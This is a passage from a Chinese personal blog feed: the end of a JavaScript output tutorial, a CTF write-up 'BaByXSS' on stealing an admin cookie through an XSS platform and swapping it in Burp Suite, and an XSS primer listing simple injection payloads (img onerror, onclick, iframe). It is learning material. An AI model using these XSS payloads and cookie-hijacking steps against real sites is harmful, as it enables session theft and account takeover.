能够以不同方式“显示”数据：</p><ul><li>使用<code>window.alert()</code>写入警告框</li><li>使用 <code>document.write()</code>写入 HTML 输出</li><li>使用 <code>innerHTML</code> 写入 HTML 元素</li><li>使用 <code>console.log()</code> 写入浏览器控制台</li></ul><h4 id="font-color-navy2使用-innerhtmlfont"><a class="markdownIt-Anchor" href="#font-color-navy2使用-innerhtmlfont"></a> <font color="navy">2.使用 innerHTML</font></h4><p><code>document.getElementById(id)</code></p><p>      id 属性定义 HTML 元素。innerHTML 属性定义 HTML 内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt;  <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="number">5</span> + <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>      <font color="red"><strong>提示</strong></font>：更改HTML 元素的 innerHTML 属性是在 HTML 中显示数据的常用方法。</p><h4 id="font-color-navy3使用-documentwritefont"><a class="markdownIt-Anchor" href="#font-color-navy3使用-documentwritefont"></a> <font color="navy">3.使用 document.write()</font></h4><p>      <strong>出于测试目的，使用 <code>document.write()</code> 比较方便.</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"document.write(5 + 6)"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>     <strong>注意：<strong>在HTML 文档完全加载后使用 <code>document.write()</code>将</strong>删除所有已有的</strong> <strong>HTML</strong>，<strong>document.write()</strong> 方法仅用于测试。</p><h4 id="font-color-navy4使用-windowalertfont"><a class="markdownIt-Anchor" href="#font-color-navy4使用-windowalertfont"></a> <font color="navy">4.使用 window.alert()</font></h4><p>      <strong>能够使用警告框来显示数据</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.alert(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="font-color-navy5使用-consolelogfont"><a class="markdownIt-Anchor" href="#font-color-navy5使用-consolelogfont"></a> <font color="navy">5.使用 console.log()</font></h4><p>      在浏览器中，您可使用 console.log() 方法来显示数据。可以通过 F12 来激活浏览器控制台，并在菜单中选择“控制台”。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-js-简介font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-js-简介font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、JS 简介&lt;/font
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="JavaScritpt" scheme="https://muzibing.github.io/tags/JavaScritpt/"/>
    
  </entry>
  
  <entry>
    <title>BaByXSS 解题总结</title>
    <link href="https://muzibing.github.io/2019/07/27/2019.07.27%EF%BC%8876%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/27/2019.07.27（76）/</id>
    <published>2019-07-26T16:00:00.000Z</published>
    <updated>2019-07-29T07:05:19.161Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1-xss-攻击font"><a class="markdownIt-Anchor" href="#font-color-navy1-xss-攻击font"></a> <font color="navy">1. XSS 攻击</font></h4><blockquote><p>​        有关 XSS 攻击的基础知识、原理、手段、类别和目的均已在昨天的博文中均有涉及，具体的可以<a href="https://muzibing.github.io/2019/07/26/2019.07.26%EF%BC%8875%EF%BC%89/">点击这里进行查看</a>，有关 XSS 攻击更详细的知识，我还会将在后期陆续进行更新和补充。</p></blockquote><h4 id="font-color-navy2-cookie-font"><a class="markdownIt-Anchor" href="#font-color-navy2-cookie-font"></a> <font color="navy">2. Cookie </font></h4><blockquote><p><strong><font color="red">① 什么是 Cookie？</font></strong></p><p>​        <strong>Cookie</strong>（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”[<a href="https://zh.wikipedia.org/wiki/Cookie#cite_note-1" target="_blank" rel="noopener">1]</a>，指某些<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%AB%99" target="_blank" rel="noopener">网站</a>为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">加密</a>）。由<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E6%99%AF%E5%85%AC%E5%8F%B8" target="_blank" rel="noopener">网景公司</a>的前雇员<a href="https://zh.wikipedia.org/wiki/%E7%9B%A7%C2%B7%E8%92%99%E7%89%B9%E5%88%A9" target="_blank" rel="noopener">卢·蒙特利</a>在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p><h5 id="font-color-red2-cookie-的用途是什么font"><a class="markdownIt-Anchor" href="#font-color-red2-cookie-的用途是什么font"></a> <font color="red">② Cookie 的用途是什么？</font></h5><p>​        因为<a href="https://zh.wikipedia.org/wiki/HTTP" target="_blank" rel="noopener">HTTP协议</a>是无状态的，即<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">服务器</a>不知道用户上一次做了什么，这严重阻碍了<a href="https://zh.wikipedia.org/wiki/%E4%BA%A4%E4%BA%92%E5%BC%8FWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">交互式Web应用程序</a>的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器<a href="https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)" target="_blank" rel="noopener">会话</a>中的状态。</p><p><br>        在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p><p><br>        <strong>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”</strong>。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">加密</a>形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p><p>注：上述信息来源 <a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener">wikipedia</a></p><h5 id="font-color-red3-什么是cookie-劫持font"><a class="markdownIt-Anchor" href="#font-color-red3-什么是cookie-劫持font"></a> <font color="red">③ 什么是Cookie 劫持？</font></h5><p>​        所谓 Cookie 劫持就是攻击者通过非法的手段获取用户浏览器的 Cookie，攻击者用获取到的 Cookie 伪装成被攻击者的身份，与服务器进行信息传递。</p></blockquote><h4 id="font-color-navy3-相关工具font"><a class="markdownIt-Anchor" href="#font-color-navy3-相关工具font"></a> <font color="Navy">3. 相关工具</font></h4><blockquote><ul><li><strong><a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite</a></strong>：Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li><li><strong><a href="http://xss.fbisb.com/xss.php" target="_blank" rel="noopener">XSS 平台</a></strong>：提供 XSS 攻击的平台。</li><li>proof</li></ul></blockquote><h4 id="font-color-navy4-其他内容font"><a class="markdownIt-Anchor" href="#font-color-navy4-其他内容font"></a> <font color="Navy">4. 其他内容</font></h4><blockquote><ul><li>代理服务的设置</li><li>Burp Suite 证书的导出以及浏览器证书的导入问题</li><li><strong>substr() 函数（字符截取函数）格式</strong>：<ul><li>格式 1：substr(string string,int a,int b);<ul><li>string：是需要截取的字符串；</li><li>a：截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）；</li><li>b：要截取的字符串的长度</li></ul></li><li>格式2：substr(string string, int a) ;<ul><li>string：是需要截取的字符串；</li><li>a：可以理解为从第a个字符开始截取后面所有的字符串。</li></ul></li></ul></li><li>python  md5 加密方式</li></ul></blockquote><h3 id="font-color-brown二-前期准备font"><a class="markdownIt-Anchor" href="#font-color-brown二-前期准备font"></a> <font color="brown">二、前期准备</font></h3><h4 id="font-color-navy1-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy1-分析题目font"></a> <font color="navy">1. 分析题目</font></h4><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/MTZLFomu6xu1alifDSR4tqOgYCQI47UjbPjRyv0R.L8!/r/dE0BAAAAAAAA" alt></p><blockquote><p>​        通过上面的题目的提示，我们一点一点的来分析题目的要求：</p><ul><li><p>首先我们所要求的 flag 在 admin.PHP 文件中，只有管理员才能得到它；</p></li><li><p>那么最直接得方法就是，我们可以发送一条消息给管理员请求他们把 flag 给我们，但是管理员是不会鸟我的；</p></li><li><p>leava a message 这一个表格中应该是我们要发送的数据；</p></li><li><p>substr(md5(’***********’),0.6) === ‘e6a5c3’  这里面的表格应该是让我们填写的内容经过一系列运算，最后的结果应该与 ‘ ’ 中的字符串同类型同值；</p><p>​        经过上述分析后，我们可以大概的清楚这道题目的<font color="red"><strong>解题思路</strong></font>：</p><ul><li>我们首先要得到 md5(’****’) 中 * 的内容，这一步估计需要自己写脚本，进行运算；</li><li>我们将 message 和正确的 string 发送给服务器，服务器应该会给我们作出反应，并且在浏览器产生 Cookie，而这个 Cookie 代表浏览器的身份；</li><li>再去点击 <font color="navy">admin.PHP</font> 就会得到我们想要的 Flag；</li></ul></li></ul></blockquote><h4 id="font-color-navy2-提出问题font"><a class="markdownIt-Anchor" href="#font-color-navy2-提出问题font"></a> <font color="navy">2. 提出问题</font></h4><blockquote><p>​        我们经过前面的分析，可能会产生如下的疑问：</p><p>​        （1）我们怎么才能得到一个 str1，在经过 MD5 加密后，并将加密后得到的字符串，经 substr() 函数截取前 <strong>6</strong> 个字符得到的 ‘ === ’ 后面跟着的字符串？</p><p>​        （2）在计算出正确的 str1 后，我们应该怎么得到 token 令牌呢？</p></blockquote><h4 id="font-color-navy3-查阅资料font"><a class="markdownIt-Anchor" href="#font-color-navy3-查阅资料font"></a> <font color="navy">3. 查阅资料</font></h4><blockquote><p>​        为了解决上述的问题，对此我上网查阅了相关的文章和资料，提出下方的解决办法：</p><p>​        （1）针对第一个问题，我们可以利用 python 的库对此进行求解；</p><p>​        （2）针对第二个问题，我们可以利用 XSS 平台来获得 Cookie 的 token 令牌；</p></blockquote><h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3><h4 id="font-color-navy1-求加密前的字符串font"><a class="markdownIt-Anchor" href="#font-color-navy1-求加密前的字符串font"></a> <font color="navy">1. 求加密前的字符串</font></h4><blockquote><p>​        相关代码如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib                  <span class="comment"># This module implements a common interface to many different secure hash and message digest algorithms. Included are the FIPS secure hash algorithms SHA1, SHA224, SHA256, SHA384, and SHA512 (defined in FIPS 180-2) as well as RSA’s MD5 algorithm </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count     <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(Md5_str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(Md5_str.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count(<span class="number">0</span>):              <span class="comment"># 这是一个计数器，是 itertools 下的一个功能</span></span><br><span class="line">    Str = md5(str(i))</span><br><span class="line">    <span class="keyword">if</span> Str.startswith(<span class="string">'Name of string'</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>​        关于上的脚本程序，我会后续进行总结和更新，现在就简单的叙述一下，在这个脚本中主要涉及了以下几个知识点：</p><p>​        （1）md5 用 python 加密需要导入 hashlib 库</p><p>​        （2）要实现一个无限循环，需要用 itertools 中的 count，有关这个用法我会在下期博客进行详细的讲解</p><p>​        （3）要明白 python 中对象的用法</p></blockquote><h4 id="font-color-navy2-利用-xss-平台获取-cookieadminfont"><a class="markdownIt-Anchor" href="#font-color-navy2-利用-xss-平台获取-cookieadminfont"></a> <font color="navy">2. 利用 XSS 平台获取 Cookie（admin）</font></h4><blockquote><p>​        如果上一步提交的字符串正确的话，那么我们就可以与服务器成功建立连接，但是这是一种非持久连接，如果我们用这时的 Cookie 再点击 admin.PHP 的话，我们就可以获取 Flag。</p><p><br>        我们将 XSS 平台的代码放到 message 中，再将得到的数值放入 MD5 中，进行提交，在 XSS 平台上 我们可以获得如下的界面：<img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/yoGqYpHiRIjLqEU3n4YiTlf13dUDCTnr8KfDkBfaF*w!/r/dL4AAAAAAAAA" alt></p><p>​这个时候我们截取到了浏览器与服务器交互的 Cookie 中的 token 令牌</p></blockquote><h4 id="font-color-navy3-设置-burp-suitefont"><a class="markdownIt-Anchor" href="#font-color-navy3-设置-burp-suitefont"></a> <font color="navy">3. 设置 Burp Suite</font></h4><blockquote><p>​在替换 Cookie 之前，我们需要用 Burp Suite 软件（需要配置 Java 环境）截断浏览器发给服务器的 Cookie，首先需要设置代理，如下图：左图为 Burp Suite 的代理，右图为浏览器（Microsoft Edge）的代理设置。两者的代理设置要一致。</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/sfiunwZ0AA4FlXCvFgkcSS8PAB4UKTFtOoH1r8WWRSU!/r/dFQBAAAAAAAA" alt></p></blockquote><h4 id="font-color-navy4-替换-cookiefont"><a class="markdownIt-Anchor" href="#font-color-navy4-替换-cookiefont"></a> <font color="navy">4. 替换 Cookie</font></h4><blockquote><p>​        当我们只是“单纯”的点击 admin.PHP 链接后，服务器会给我们一个这样的页面：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/6dv26Wy04Py1bAfWA0fOze0*Xv0nhmSK8mEC2lc.HQw!/r/dL8AAAAAAAAA" alt></p><p>​        该页面说明我们不是以管理员的身份访问服务器的，所以自然也不能得到 flag。那么我们该怎么以管理员的身份访问服务器呢？前面我们提交了一个 MD5 加密前的一个字符串，以及一个 XSS 代码，服务器给我们返回的页面如下：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/RnJVyZn0qtflOXlmBUGUBjtmFfYQ*YOW8LCIxIZqAAc!/r/dFQBAAAAAAAA" alt></p><p>​        红色标注意思为：<font color="red"><strong>您的邮件已在管理员列表的队列中</strong></font>，说明前面我们前面得到的 Cookie 已经被放入管理员列表中了，我们可以通过 XSS 平台获取的 Cookie 进入 admin.PHP （也就是以管理员的身份进入 admin.PHP）得到 flag。</p><p>​        我们点击<font color="navy"> admin.PHP</font> 后，Burp Suite 会为我们截获一个浏览器发送给服务器的请求，在这个请求会存在一个 Cookie，这个Cookie 的数据就是我们将要替换的目标，如下图所示：<img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/iBXwrFzF1PCvzaOgvNpKTUL3qTURpCRykNIEau1lmio!/r/dFMBAAAAAAAA" alt></p><p>​        在将 Cookie 进行替换后，下一步只需要点击 “Forward” 按钮，将网页数据发送给服务器。<img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/x5oLgkHhVxJEYsMj0xQ1fijgbE2jwvDPxWstkc2H10k!/r/dLYAAAAAAAAA" alt></p><p>​        这个时候服务器会识别 GET 中的 Cookie，发现该 Cookie 在管理员的列表中，服务器于是认为发送该请求的主体是 admin，于是服务器会把 flag 返回给浏览器，如下图：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/ArLdu7aCmVNQAYYMQYQxajyakybQlwqBSrSLvdprhvo!/r/dLgAAAAAAAAA" alt></p></blockquote><h3 id="font-color-brown四-遗留问题font"><a class="markdownIt-Anchor" href="#font-color-brown四-遗留问题font"></a> <font color="brown">四、遗留问题</font></h3><blockquote><p>​        虽然这道题目做出来了，但是仍然有很多问题等着我去解决，现在将这些问题一一列举出来，以方便以后的学习：</p><ol><li>Cookie 的完整机制和知识</li><li>XSS 的完整知识体系结构</li><li>HTML 的运行原理</li><li>python MD5 的加密和解密程序分析</li><li>Burp Suite 的其他功能</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS 基础知识（一）</title>
    <link href="https://muzibing.github.io/2019/07/26/2019.07.26%EF%BC%8875%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/26/2019.07.26（75）/</id>
    <published>2019-07-25T16:00:00.000Z</published>
    <updated>2019-07-26T12:27:49.825Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><p><font color="navy"><strong>① 什么是 XSS？</strong></font></p><blockquote><p>        XSS ，跨站脚本攻击，英文全称为：Cross Site Script，但是为了与层叠样式表的缩写（CSS）相区分，所以在安全领域叫做 “XSS”。</p><p>​XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是<strong>JavaScript</strong>，但实际上也可以包括 <strong>Java、 VBScript、ActiveX、 Flash</strong> 或者甚至是普通的<strong>HTML</strong>。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p></blockquote><p><font color="navy"><strong>② JavaScript 详细内容</strong></font></p><blockquote><p>​将会在后期的学习中陆续更新。</p></blockquote><h3 id="font-colorbrown二-xss-攻击font"><a class="markdownIt-Anchor" href="#font-colorbrown二-xss-攻击font"></a> <font color="brown">二、XSS 攻击</font></h3><p><font color="navy"><strong>① XSS 攻击的原理是什么？</strong></font></p><blockquote><p><img src="https://img-blog.csdn.net/20180517143130413?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lqY2xzeA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p><p>​HTML是一种<strong>超文本标记语言</strong>，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，<title> 与 </title>之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p></blockquote><p><font color="navy"><strong>② XSS 攻击的类型</strong></font></p><blockquote><ol><li><font color="red">持久型跨站</font>：最直接的危害类型，跨站代码存储在服务器（数据库）</li><li><font color="red">非持久型跨站</font>：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码</li><li><font color="red">DOM跨站（DOM XSS）</font>:DOM（document object model 文档对象模型），客户端脚本处理逻辑导致的安全问题</li></ol></blockquote><p><font color="navy"><strong>③ XSS 常见的攻击手段和目的</strong></font></p><blockquote><ol><li><font color="red"><strong>盗用cookie</strong></font>，获取敏感信息。</li><li><font color="red"><strong>破坏正常的页面结构,插入一些恶意内容</strong></font></li><li><font color="red"><strong>利用植入Flash，通过crossdomain权限设置进一步获取更高权限</strong></font>（不常用了）；或者利用Java等得到类似的操作;</li><li><font color="red"><strong>利用iframe、frame、XMLHttpRequest或上述Flash等方式</strong></font>，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作;</li><li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动;</li><li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS击的效果。</li></ol></blockquote><p><font color="navy"><strong>④ 代码案例</strong></font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">植入代码自动触发</span><br><span class="line">  /?xss=<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"null"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  植入代码引诱触发</span></span><br><span class="line"><span class="xml">  /?xss=<span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">"alert('点我')"</span> /&gt;</span>点我<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  植入代码嵌入页面</span></span><br><span class="line"><span class="xml">  /?xss=<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/t.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="font-colorbrown三-相关知识点font"><a class="markdownIt-Anchor" href="#font-colorbrown三-相关知识点font"></a> <font color="brown">三、相关知识点</font></h3><blockquote><p>​在 XSS 攻击中涉及到许多得知识点，我仍然有很多不会的甚至不了解的，再次列举一下相关的知识点，为以后的学习指明方向。</p><ol><li>JavaScript</li><li>HTTP 原理</li><li>HTML 语言</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>乘法链算法的实现</title>
    <link href="https://muzibing.github.io/2019/07/20/2019.07.20%EF%BC%8874%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/20/2019.07.20（74）/</id>
    <published>2019-07-19T16:00:00.000Z</published>
    <updated>2019-07-26T12:34:19.296Z</updated>
    
